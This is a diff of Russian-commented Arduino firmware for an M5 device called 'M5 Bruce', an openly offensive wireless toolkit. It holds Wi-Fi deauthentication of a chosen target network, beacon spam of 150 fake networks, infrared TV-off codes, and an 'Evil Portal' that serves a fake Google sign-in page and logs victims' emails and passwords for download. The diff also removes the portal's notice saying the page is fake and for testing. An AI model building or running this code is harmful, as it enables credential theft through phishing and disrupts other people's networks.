@@ -7,7 +7,6 @@
 
 // ================= НАСТРОЙКИ =================
 const char* ssid     = "M5_Bruce"; 
-// Сеть открытая, без пароля
 
 WebServer server(80);
 DNSServer dnsServer;
@@ -21,18 +20,15 @@ unsigned long lastBeaconTime = 0;
 unsigned long lastDeauthTime = 0;
 int packetCount = 0;
 
-// ================= ИК =================
 #define IR_PIN 43
 
-// ================= ДЕАУТ =================
 uint8_t target_bssid[6] = {0};
 uint8_t target_channel = 1;
 bool scan_in_progress = false;
 
-// ================= ЛОГИ =================
 String logs = "";
 
-// ================= ПРОТОТИПЫ =================
+// Прототипы
 void drawUI();
 void killTvBrand(int region, int brand);
 void killAllTv(int region);
@@ -44,7 +40,6 @@ void savePassword(String email, String pass);
 void loadLogs();
 void saveLogsToFile();
 
-// ================= 12 ТЕМ =================
 struct Theme { uint16_t bg; uint16_t text; uint16_t accent; };
 Theme themes[12] = {
   {BLACK, WHITE, RED}, {BLACK, GREEN, GREEN}, {NAVY, CYAN, WHITE}, {MAROON, YELLOW, WHITE},
@@ -53,7 +48,6 @@ Theme themes[12] = {
 };
 int currentTheme = 0;
 
-// ================= 150 СЕТЕЙ =================
 const char* spam_ssids[] = {
   "Free_Public_WiFi", "FBI_Surveillance_Van", "Virus_Detected", "Windows_Update", "Update_Required",
   "Do_Not_Connect", "Hack_Me", "No_Internet", "WiFi_Error", "Connect_To_Continue",
@@ -92,166 +86,142 @@ const char* spam_ssids[] = {
 const int num_ssids = sizeof(spam_ssids) / sizeof(spam_ssids[0]);
 
 // ================= БАЗА КОДОВ ТВ =================
-struct IrCode {
-  uint32_t freq;
-  uint8_t numPairs;
-  uint8_t bitsPerIndex;
-  const uint16_t *times;
-  const uint8_t *codes;
-};
-
 const uint16_t samsung_na_times[] = { 60, 60, 60, 2700, 120, 60, 240, 60 };
 const uint8_t samsung_na_codes[] = { 0xE2, 0x20, 0x80, 0x78, 0x88, 0x20, 0x10 };
-const struct IrCode samsung_na_code = { 38400, 26, 2, samsung_na_times, samsung_na_codes };
+const int samsung_na_pairs = 26;
+const int samsung_na_freq = 38400;
 
 const uint16_t lg_na_times[] = { 50, 100, 50, 200, 50, 800, 400, 400 };
 const uint8_t lg_na_codes[] = { 0xD5, 0x41, 0x11, 0x00, 0x14, 0x44, 0x6D, 0x54, 0x11, 0x10, 0x01, 0x44, 0x45 };
-const struct IrCode lg_na_code = { 57143, 52, 2, lg_na_times, lg_na_codes };
+const int lg_na_pairs = 52;
+const int lg_na_freq = 57143;
 
 const uint16_t philips_eu_times[] = { 36, 36, 36, 105, 36, 800, 400, 400 };
 const uint8_t philips_eu_codes[] = { 0x0C, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
-const struct IrCode philips_eu_code = { 36000, 14, 2, philips_eu_times, philips_eu_codes };
+const int philips_eu_pairs = 14;
+const int philips_eu_freq = 36000;
 
 const uint16_t pana_eu_times[] = { 26, 185, 27, 80, 27, 185, 27, 4549 };
 const uint8_t pana_eu_codes[] = { 0x15, 0x5A, 0x65, 0x67, 0x95, 0x65, 0x9A, 0x9B, 0x99 };
-const struct IrCode pana_eu_code = { 38610, 64, 2, pana_eu_times, pana_eu_codes };
+const int pana_eu_pairs = 64;
+const int pana_eu_freq = 38610;
 
-const struct IrCode* na_codes[][3] = {
-  { &samsung_na_code, NULL, NULL },
-  { &lg_na_code, NULL, NULL }
-};
-const int num_na_brands = 2;
-
-const struct IrCode* eu_codes[][3] = {
-  { &philips_eu_code, NULL, NULL },
-  { &pana_eu_code, NULL, NULL }
-};
-const int num_eu_brands = 2;
-
-// ================= HTML WEBUI =================
+// ================= HTML WEBUI (ИСПРАВЛЕННЫЙ JS) =================
 const char index_html[] PROGMEM = R"rawliteral(
 <!DOCTYPE HTML><html>
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-  <title>M5 Bruce</title>
+  <title>M5 BRUCE</title>
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; }
-    body { font-family: 'Courier New', Courier, monospace; background: #000; color: #fff; overflow: hidden; }
+    * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; font-family: 'Courier New', monospace; }
+    body { background: #000; color: #fff; overflow: hidden; }
     #app { height: 100vh; display: flex; flex-direction: column; position: relative; overflow: hidden; }
-    .page { position: absolute; top: 0; left: 0; width: 100%; height: 100%; padding: 20px 20px 80px 20px; display: flex; flex-direction: column; transition: transform 0.3s ease, opacity 0.3s ease; overflow-y: auto; background: #000; }
-    .page.hidden { transform: translateX(100%); opacity: 0; pointer-events: none; }
-    .page.active { transform: translateX(0); opacity: 1; }
-    h1 { font-size: 24px; color: #fff; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 2px; border-bottom: 2px solid #fff; padding-bottom: 10px; font-weight: bold; }
-    h2 { font-size: 18px; color: #fff; margin-bottom: 15px; margin-top: 20px; text-transform: uppercase; border-bottom: 1px solid #555; padding-bottom: 5px; }
-    .menu-btn { background: #000; border: 2px solid #fff; border-radius: 0; padding: 20px; margin-bottom: 15px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; transition: 0.1s; color: #fff; }
+    
+    .page { position: absolute; top: 0; left: 0; width: 100%; height: 100%; padding: 20px 20px 80px 20px; display: none; flex-direction: column; overflow-y: auto; background: #000; }
+    .page.active { display: flex; } /* ВОТ ГЛАВНОЕ ИСПРАВЛЕНИЕ: используем display: none / flex вместо transform */
+    
+    h1 { font-size: 20px; color: #0f0; margin-bottom: 15px; text-transform: uppercase; border-bottom: 2px dashed #0f0; padding-bottom: 10px; font-weight: bold; letter-spacing: 1px; }
+    h2 { font-size: 16px; color: #fff; margin-bottom: 15px; margin-top: 20px; text-transform: uppercase; }
+    
+    .menu-btn { background: #000; border: 2px solid #fff; padding: 15px; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; color: #fff; }
     .menu-btn:active { background: #fff; color: #000; }
-    .menu-btn:active .text, .menu-btn:active .icon, .menu-btn:active .arrow { color: #000; }
-    .menu-btn .icon { font-size: 32px; margin-right: 15px; }
-    .menu-btn .text { font-size: 20px; font-weight: bold; flex: 1; text-align: left; letter-spacing: 1px; }
-    .menu-btn .arrow { font-size: 24px; }
-    button { background: #000; color: #fff; border: 2px solid #fff; padding: 15px; border-radius: 0; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; font-family: inherit; }
+    .menu-btn .text { font-size: 16px; font-weight: bold; flex: 1; text-align: left; }
+    .menu-btn .icon { font-size: 20px; margin-right: 10px; }
+    
+    button { background: #000; color: #fff; border: 2px solid #fff; padding: 12px; width: 100%; font-weight: bold; font-size: 14px; cursor: pointer; margin-bottom: 10px; text-transform: uppercase; }
     button:active { background: #fff; color: #000; }
-    select { padding: 12px; width: 100%; margin-bottom: 15px; background: #000; color: #fff; border: 2px solid #fff; border-radius: 0; font-size: 16px; outline: none; font-family: inherit; text-transform: uppercase; appearance: none; }
-    #backBtn { position: fixed; bottom: 0; left: 0; width: 100%; background: #fff; color: #000; border: none; padding: 20px; font-size: 18px; font-weight: bold; cursor: pointer; z-index: 100; border-radius: 0; display: none; text-transform: uppercase; font-family: inherit; }
+    
+    select { padding: 10px; width: 100%; margin-bottom: 15px; background: #000; color: #fff; border: 2px solid #fff; font-size: 14px; outline: none; }
+    
+    #backBtn { position: fixed; bottom: 0; left: 0; width: 100%; background: #fff; color: #000; border: none; padding: 15px; font-size: 16px; font-weight: bold; cursor: pointer; z-index: 100; display: none; }
     #backBtn:active { background: #555; }
-    .status-box { padding: 15px; background: #000; border: 2px solid #fff; margin-bottom: 15px; font-size: 14px; text-transform: uppercase; }
-    #scan-results { max-height: 250px; overflow-y: auto; background: #000; border: 2px solid #fff; padding: 10px; margin-bottom: 15px; text-align: left; font-size: 13px; }
-    .net-item { padding: 10px; border-bottom: 1px dashed #555; cursor: pointer; text-transform: uppercase; }
+    
+    .status-box { padding: 10px; background: #000; border: 2px solid #fff; margin-bottom: 15px; font-size: 12px; text-transform: uppercase; }
+    
+    #scan-results { max-height: 200px; overflow-y: auto; background: #000; border: 2px solid #fff; padding: 10px; margin-bottom: 15px; text-align: left; font-size: 12px; }
+    .net-item { padding: 8px; border-bottom: 1px dashed #555; cursor: pointer; }
     .net-item:active { background: #fff; color: #000; }
-    .net-item.selected { background: #fff; color: #000; font-weight: bold; border-bottom: 2px solid #fff; }
-    #logs { background: #000; color: #fff; font-family: monospace; font-size: 12px; padding: 10px; border: 2px solid #fff; height: 200px; overflow-y: auto; margin-bottom: 15px; white-space: pre-wrap; }
+    .net-item.selected { background: #fff; color: #000; font-weight: bold; }
+    
+    #logs { background: #000; color: #0f0; font-size: 11px; padding: 10px; border: 2px solid #fff; height: 150px; overflow-y: auto; margin-bottom: 15px; white-space: pre-wrap; }
     .hidden { display: none !important; }
-    .btn-row { display: flex; gap: 10px; }
+    .btn-row { display: flex; gap: 5px; }
   </style>
 </head>
 <body>
   <div id="app">
-    
     <div id="page-main" class="page active">
       <h1>M5 BRUCE</h1>
       <div class="menu-btn" onclick="goTo('page-wifi')">
-        <span class="icon">[+]</span><span class="text">WI-FI АТАКИ</span><span class="arrow">></span>
+        <span class="icon">[+]</span><span class="text">WI-FI</span><span class="arrow">></span>
       </div>
       <div class="menu-btn" onclick="goTo('page-ir')">
-        <span class="icon">[~]</span><span class="text">ИК-ПУЛЬТ (TV-B-GONE)</span><span class="arrow">></span>
+        <span class="icon">[~]</span><span class="text">ИК-ПУЛЬТ</span><span class="arrow">></span>
       </div>
       <div class="menu-btn" onclick="goTo('page-logs')">
-        <span class="icon">[*]</span><span class="text">ЛОГИ / ПАРОЛИ</span><span class="arrow">></span>
+        <span class="icon">[*]</span><span class="text">ЛОГИ</span><span class="arrow">></span>
       </div>
     </div>
 
-    <div id="page-wifi" class="page hidden">
-      <h1>WI-FI АТАКИ</h1>
-      <div class="menu-btn" onclick="goTo('page-deauth')">
-        <span class="icon">[!]</span><span class="text">TARGET DEAUTH</span><span class="arrow">></span>
-      </div>
-      <div class="menu-btn" onclick="goTo('page-beacon')">
-        <span class="icon">[>]</span><span class="text">BEACON SPAM (150)</span><span class="arrow">></span>
-      </div>
-      <div class="menu-btn" onclick="goTo('page-portal')">
-        <span class="icon">[?]</span><span class="text">EVIL PORTAL</span><span class="arrow">></span>
-      </div>
+    <div id="page-wifi" class="page">
+      <h1>WI-FI</h1>
+      <button onclick="goTo('page-deauth')">DEAUTH</button>
+      <button onclick="goTo('page-beacon')">BEACON SPAM</button>
+      <button onclick="goTo('page-portal')">EVIL PORTAL</button>
     </div>
 
-    <div id="page-deauth" class="page hidden">
-      <h1>TARGET DEAUTH</h1>
-      <button onclick="scanNetworks()">СКАНИРОВАТЬ СЕТИ</button>
-      <div id="scan-results">НАЖМИТЕ "СКАНИРОВАТЬ"</div>
+    <div id="page-deauth" class="page">
+      <h1>DEAUTH</h1>
+      <button onclick="scanNetworks()">СКАНИРОВАТЬ</button>
+      <div id="scan-results">НАЖМИТЕ</div>
       <button id="btnDeauth" onclick="toggleDeauth()" class="hidden">АТАКОВАТЬ</button>
       <div id="status-deauth" class="status-box">НЕ АКТИВНО</div>
     </div>
 
-    <div id="page-beacon" class="page hidden">
+    <div id="page-beacon" class="page">
       <h1>BEACON SPAM</h1>
-      <p style="color: #aaa; margin-bottom: 15px;">СОЗДАЕТ 150 ФЕЙКОВЫХ СЕТЕЙ WI-FI.</p>
       <button id="btnWifi" onclick="toggleWifi()">ЗАГРУЗКА...</button>
       <div id="status-wifi" class="status-box">ПРОВЕРКА...</div>
     </div>
 
-    <div id="page-portal" class="page hidden">
+    <div id="page-portal" class="page">
       <h1>EVIL PORTAL</h1>
-      <p style="color: #aaa; margin-bottom: 15px;">ФЕЙКОВАЯ СТРАНИЦА GOOGLE. ЖЕРТВА ВВОДИТ ПАРОЛЬ.</p>
-      <button id="btnPortal" onclick="togglePortal()">ЗАПУСТИТЬ ПОРТАЛ</button>
+      <button id="btnPortal" onclick="togglePortal()">ЗАПУСТИТЬ</button>
       <div id="status-portal" class="status-box">НЕ АКТИВНО</div>
-      <h2>ПОХИЩЕННЫЕ ДАННЫЕ:</h2>
+      <h2>ДАННЫЕ:</h2>
       <div id="logs">ОЖИДАНИЕ...</div>
     </div>
 
-    <div id="page-ir" class="page hidden">
+    <div id="page-ir" class="page">
       <h1>ИК-ПУЛЬТ</h1>
-      <p style="color: #aaa; margin-bottom: 15px;">ВЫБЕРИТЕ РЕГИОН ДЛЯ TV-B-GONE.</p>
-      <div class="menu-btn" onclick="goTo('page-tvbg-na')">
-        <span class="icon">[A]</span><span class="text">REGION NA (АМЕРИКА/АЗИЯ)</span><span class="arrow">></span>
-      </div>
-      <div class="menu-btn" onclick="goTo('page-tvbg-eu')">
-        <span class="icon">[E]</span><span class="text">REGION EU (ЕВРОПА)</span><span class="arrow">></span>
-      </div>
+      <button onclick="goTo('page-tvbg-na')">REGION NA</button>
+      <button onclick="goTo('page-tvbg-eu')">REGION EU</button>
     </div>
 
-    <div id="page-tvbg-na" class="page hidden">
+    <div id="page-tvbg-na" class="page">
       <h1>TV-B-GONE NA</h1>
       <select id="tvSelectNA">
-        <option value="0">SAMSUNG (NA)</option>
-        <option value="1">LG (NA)</option>
+        <option value="0">SAMSUNG</option>
+        <option value="1">LG</option>
       </select>
-      <button onclick="killTvNA()">ВЫКЛЮЧИТЬ ВЫБРАННЫЙ</button>
-      <button onclick="killAllNA()">ВЫКЛЮЧИТЬ ВСЕ (NA)</button>
+      <button onclick="killTvNA()">ВЫКЛЮЧИТЬ</button>
+      <button onclick="killAllNA()">ВЫКЛЮЧИТЬ ВСЕ</button>
       <div id="status-tv-na" class="status-box">ОЖИДАНИЕ...</div>
     </div>
 
-    <div id="page-tvbg-eu" class="page hidden">
+    <div id="page-tvbg-eu" class="page">
       <h1>TV-B-GONE EU</h1>
       <select id="tvSelectEU">
-        <option value="0">PHILIPS (EU)</option>
-        <option value="1">PANASONIC (EU)</option>
+        <option value="0">PHILIPS</option>
+        <option value="1">PANASONIC</option>
       </select>
-      <button onclick="killTvEU()">ВЫКЛЮЧИТЬ ВЫБРАННЫЙ</button>
-      <button onclick="killAllEU()">ВЫКЛЮЧИТЬ ВСЕ (EU)</button>
+      <button onclick="killTvEU()">ВЫКЛЮЧИТЬ</button>
+      <button onclick="killAllEU()">ВЫКЛЮЧИТЬ ВСЕ</button>
       <div id="status-tv-eu" class="status-box">ОЖИДАНИЕ...</div>
     </div>
 
-    <div id="page-logs" class="page hidden">
+    <div id="page-logs" class="page">
       <h1>ЛОГИ</h1>
       <div class="btn-row">
         <button onclick="downloadLogs()">СКАЧАТЬ</button>
@@ -265,49 +235,52 @@ const char index_html[] PROGMEM = R"rawliteral(
 
   <script>
     let history = ['page-main'];
+
     function goTo(pageId) {
+      // Прячем все страницы
       document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      // Показываем нужную
       document.getElementById(pageId).classList.add('active');
+      // Запоминаем историю
       history.push(pageId);
-      if(pageId !== 'page-main') document.getElementById('backBtn').style.display = 'block';
+      // Показываем кнопку "Назад", если мы не на главной
+      document.getElementById('backBtn').style.display = (pageId === 'page-main') ? 'none' : 'block';
+      
       if(pageId === 'page-logs') fetchLogs();
     }
+
     function goBack() {
       if(history.length > 1) {
         history.pop();
         let prev = history[history.length - 1];
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById(prev).classList.add('active');
-        if(prev === 'page-main') document.getElementById('backBtn').style.display = 'none';
+        goTo(prev);
+        // Убираем дублирование в истории при возврате
+        history.pop(); 
       }
     }
 
+    // Wi-Fi Spam
     let isWifiOn = false;
     function toggleWifi() {
       let ep = isWifiOn ? '/wifi/off' : '/wifi/on';
-      fetch(ep).then(r => r.text()).then(() => updateWifiUI());
-    }
-    function updateWifiUI() {
-      fetch('/status').then(r => r.text()).then(t => {
-        isWifiOn = (t === 'ON');
-        let btn = document.getElementById('btnWifi');
-        let stat = document.getElementById('status-wifi');
-        if(isWifiOn) { btn.innerText = 'ВЫКЛЮЧИТЬ СПАМ'; stat.innerText = 'СПАМ АКТИВЕН'; }
-        else { btn.innerText = 'ВКЛЮЧИТЬ СПАМ'; stat.innerText = 'СПАМ ВЫКЛЮЧЕН'; }
+      fetch(ep).then(r => r.text()).then(() => {
+        isWifiOn = !isWifiOn;
+        document.getElementById('btnWifi').innerText = isWifiOn ? 'ВЫКЛЮЧИТЬ' : 'ВКЛЮЧИТЬ';
+        document.getElementById('status-wifi').innerText = isWifiOn ? 'АКТИВЕН' : 'ВЫКЛЮЧЕН';
       });
     }
 
+    // Deauth
     let isDeauthOn = false;
     let selectedBssid = "";
     let selectedChannel = 0;
     function scanNetworks() {
-      document.getElementById('scan-results').innerText = "СКАНИРОВАНИЕ...";
+      document.getElementById('scan-results').innerText = "СКАНИРОВАНИЕ... (10-15 СЕК)";
       fetch('/scan').then(r => r.text()).then(data => {
         document.getElementById('scan-results').innerHTML = data;
-        let items = document.querySelectorAll('.net-item');
-        items.forEach(item => {
+        document.querySelectorAll('.net-item').forEach(item => {
           item.onclick = function() {
-            items.forEach(i => i.classList.remove('selected'));
+            document.querySelectorAll('.net-item').forEach(i => i.classList.remove('selected'));
             this.classList.add('selected');
             selectedBssid = this.dataset.bssid;
             selectedChannel = this.dataset.channel;
@@ -319,66 +292,54 @@ const char index_html[] PROGMEM = R"rawliteral(
     }
     function toggleDeauth() {
       if(!selectedBssid) { alert("ВЫБЕРИ СЕТЬ!"); return; }
-      let ep = isDeauthOn ? '/deauth/off' : '/deauth/on';
-      let url = ep;
-      if(!isDeauthOn) url += '?bssid=' + selectedBssid + '&channel=' + selectedChannel;
-      fetch(url).then(r => r.text()).then(t => {
+      let ep = isDeauthOn ? '/deauth/off' : '/deauth/on?bssid=' + selectedBssid + '&channel=' + selectedChannel;
+      fetch(ep).then(r => r.text()).then(() => {
         isDeauthOn = !isDeauthOn;
         let btn = document.getElementById('btnDeauth');
-        if(isDeauthOn) { btn.innerText = 'ОСТАНОВИТЬ'; document.getElementById('status-deauth').innerText = "АТАКА!"; }
-        else { btn.innerText = 'АТАКОВАТЬ'; document.getElementById('status-deauth').innerText = "НЕ АКТИВНО"; }
+        let stat = document.getElementById('status-deauth');
+        btn.innerText = isDeauthOn ? 'ОСТАНОВИТЬ' : 'АТАКОВАТЬ';
+        stat.innerText = isDeauthOn ? 'АТАКА!' : 'НЕ АКТИВНО';
       });
     }
 
+    // Portal
     let isPortalOn = false;
     function togglePortal() {
       let ep = isPortalOn ? '/portal/off' : '/portal/on';
-      fetch(ep).then(r => r.text()).then(t => {
+      fetch(ep).then(r => r.text()).then(() => {
         isPortalOn = !isPortalOn;
         let btn = document.getElementById('btnPortal');
         let stat = document.getElementById('status-portal');
-        if(isPortalOn) { btn.innerText = 'ОСТАНОВИТЬ ПОРТАЛ'; stat.innerText = 'ПОРТАЛ АКТИВЕН'; }
-        else { btn.innerText = 'ЗАПУСТИТЬ ПОРТАЛ'; stat.innerText = 'НЕ АКТИВНО'; }
+        btn.innerText = isPortalOn ? 'ОСТАНОВИТЬ' : 'ЗАПУСТИТЬ';
+        stat.innerText = isPortalOn ? 'АКТИВЕН' : 'НЕ АКТИВНО';
       });
     }
 
+    // Logs
     function fetchLogs() {
       fetch('/logs').then(r => r.text()).then(t => {
         document.getElementById('logs-main').innerText = t;
         document.getElementById('logs').innerText = t;
       });
     }
-    function downloadLogs() {
-      window.location.href = '/download_logs';
-    }
-    function clearLogs() {
-      fetch('/clear_logs').then(r => r.text()).then(t => {
-        document.getElementById('logs-main').innerText = "ПУСТО...";
-        document.getElementById('logs').innerText = "ОЖИДАНИЕ...";
-      });
-    }
+    function downloadLogs() { window.location.href = '/download_logs'; }
+    function clearLogs() { fetch('/clear_logs').then(() => { document.getElementById('logs-main').innerText = "ПУСТО"; document.getElementById('logs').innerText = "ОЖИДАНИЕ"; }); }
 
-    function killTvNA() {
-      let brand = document.getElementById('tvSelectNA').value;
-      document.getElementById('status-tv-na').innerText = "СТРЕЛЯЕМ...";
-      fetch('/tv/kill?region=0&brand=' + brand).then(r => r.text()).then(t => { document.getElementById('status-tv-na').innerText = t; });
-    }
-    function killAllNA() {
-      document.getElementById('status-tv-na').innerText = "РАССТРЕЛ ВСЕХ (NA)...";
-      fetch('/tv/killall?region=0').then(r => r.text()).then(t => { document.getElementById('status-tv-na').innerText = t; });
-    }
-    function killTvEU() {
-      let brand = document.getElementById('tvSelectEU').value;
-      document.getElementById('status-tv-eu').innerText = "СТРЕЛЯЕМ...";
-      fetch('/tv/kill?region=1&brand=' + brand).then(r => r.text()).then(t => { document.getElementById('status-tv-eu').innerText = t; });
-    }
-    function killAllEU() {
-      document.getElementById('status-tv-eu').innerText = "РАССТРЕЛ ВСЕХ (EU)...";
-      fetch('/tv/killall?region=1').then(r => r.text()).then(t => { document.getElementById('status-tv-eu').innerText = t; });
-    }
+    // IR
+    function killTvNA() { fetch('/tv/kill?region=0&brand=' + document.getElementById('tvSelectNA').value).then(r => r.text()).then(t => { document.getElementById('status-tv-na').innerText = t; }); }
+    function killAllNA() { fetch('/tv/killall?region=0').then(r => r.text()).then(t => { document.getElementById('status-tv-na').innerText = t; }); }
+    function killTvEU() { fetch('/tv/kill?region=1&brand=' + document.getElementById('tvSelectEU').value).then(r => r.text()).then(t => { document.getElementById('status-tv-eu').innerText = t; }); }
+    function killAllEU() { fetch('/tv/killall?region=1').then(r => r.text()).then(t => { document.getElementById('status-tv-eu').innerText = t; }); }
 
-    setInterval(updateWifiUI, 2000);
-    updateWifiUI();
+    setInterval(() => {
+      if(document.getElementById('page-beacon').classList.contains('active')) {
+        fetch('/status').then(r => r.text()).then(t => {
+          isWifiOn = (t === 'ON');
+          document.getElementById('btnWifi').innerText = isWifiOn ? 'ВЫКЛЮЧИТЬ' : 'ВКЛЮЧИТЬ';
+          document.getElementById('status-wifi').innerText = isWifiOn ? 'АКТИВЕН' : 'ВЫКЛЮЧЕН';
+        });
+      }
+    }, 3000);
   </script>
 </body>
 </html>
@@ -401,7 +362,6 @@ const char portal_html[] PROGMEM = R"rawliteral(
   input:focus { border: 2px solid #1a73e8; padding: 11px; }
   button { width: 100%; background: #1a73e8; color: white; border: none; padding: 12px; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: 500; }
   button:hover { background: #1b66c9; }
-  .footer { margin-top: 20px; font-size: 12px; color: #5f6368; text-align: center; }
 </style>
 </head>
 <body>
@@ -416,32 +376,24 @@ const char portal_html[] PROGMEM = R"rawliteral(
       <input type="password" name="password" placeholder="Пароль" required>
       <button type="submit">Далее</button>
     </form>
-    <div class="footer">Это фейковая страница для тестов.</div>
   </div>
 </body></html>
 )rawliteral";
 
-// ================= ЛОГИ ФУНКЦИИ =================
+// ================= ЛОГИ =================
 void loadLogs() {
   File f = SPIFFS.open("/logs.txt", "r");
-  if (f) {
-    logs = f.readString();
-    f.close();
-  }
+  if (f) { logs = f.readString(); f.close(); }
 }
 
 void saveLogsToFile() {
   File f = SPIFFS.open("/logs.txt", "w");
-  if (f) {
-    f.print(logs);
-    f.close();
-  }
+  if (f) { f.print(logs); f.close(); }
 }
 
 void savePassword(String email, String pass) {
   logs += "Email: " + email + "\nPass: " + pass + "\n---\n";
   saveLogsToFile();
-  
   M5.Display.fillScreen(BLACK);
   M5.Display.setTextColor(WHITE);
   M5.Display.setCursor(10, 10);
@@ -487,8 +439,7 @@ void drawUI() {
   M5.Display.print("Packets: "); M5.Display.print(packetCount);
   M5.Display.setCursor(10, 105);
   M5.Display.print("IP: ");
-  if (strlen(ssid) > 0) M5.Display.print(WiFi.localIP());
-  else { M5.Display.print(WiFi.softAPIP()); }
+  M5.Display.print(WiFi.softAPIP());
   
   if (isDeauthing) {
     M5.Display.setTextColor(RED);
@@ -543,18 +494,15 @@ void killTvBrand(int region, int brand) {
   M5.Display.setCursor(10, 40);
   M5.Display.print("FIRE!");
   
-  const struct IrCode* (*region_codes)[3] = (region == 0) ? na_codes : eu_codes;
-  int num_brands = (region == 0) ? num_na_brands : num_eu_brands;
-  
-  if (brand >= num_brands) return;
-  
   for (int j = 0; j < 3; j++) {
-    for (int i = 0; i < 3; i++) {
-      const struct IrCode *c = region_codes[brand][i];
-      if (c == NULL) break;
-      sendRawCode(c->times, c->codes, c->numPairs, c->bitsPerIndex, c->freq);
-      delay(50);
+    if (region == 0) {
+      if (brand == 0) sendRawCode(samsung_na_times, samsung_na_codes, samsung_na_pairs, 2, samsung_na_freq);
+      else if (brand == 1) sendRawCode(lg_na_times, lg_na_codes, lg_na_pairs, 2, lg_na_freq);
+    } else {
+      if (brand == 0) sendRawCode(philips_eu_times, philips_eu_codes, philips_eu_pairs, 2, philips_eu_freq);
+      else if (brand == 1) sendRawCode(pana_eu_times, pana_eu_codes, pana_eu_pairs, 2, pana_eu_freq);
     }
+    delay(50);
   }
   
   isTvKilling = false;
@@ -568,21 +516,18 @@ void killAllTv(int region) {
   M5.Display.setTextSize(2);
   M5.Display.setCursor(10, 40);
   M5.Display.print("KILL ALL");
-  M5.Display.setCursor(10, 70);
-  M5.Display.print("TV!");
   
-  const struct IrCode* (*region_codes)[3] = (region == 0) ? na_codes : eu_codes;
-  int num_brands = (region == 0) ? num_na_brands : num_eu_brands;
-  
-  for (int b = 0; b < num_brands; b++) {
-    for (int j = 0; j < 3; j++) { 
-      for (int i = 0; i < 3; i++) {
-        const struct IrCode *c = region_codes[b][i];
-        if (c == NULL) break;
-        sendRawCode(c->times, c->codes, c->numPairs, c->bitsPerIndex, c->freq);
-        delay(50);
-      }
+  for (int j = 0; j < 3; j++) {
+    if (region == 0) {
+      sendRawCode(samsung_na_times, samsung_na_codes, samsung_na_pairs, 2, samsung_na_freq);
+      delay(50);
+      sendRawCode(lg_na_times, lg_na_codes, lg_na_pairs, 2, lg_na_freq);
+    } else {
+      sendRawCode(philips_eu_times, philips_eu_codes, philips_eu_pairs, 2, philips_eu_freq);
+      delay(50);
+      sendRawCode(pana_eu_times, pana_eu_codes, pana_eu_pairs, 2, pana_eu_freq);
     }
+    delay(100);
   }
   
   isTvKilling = false;
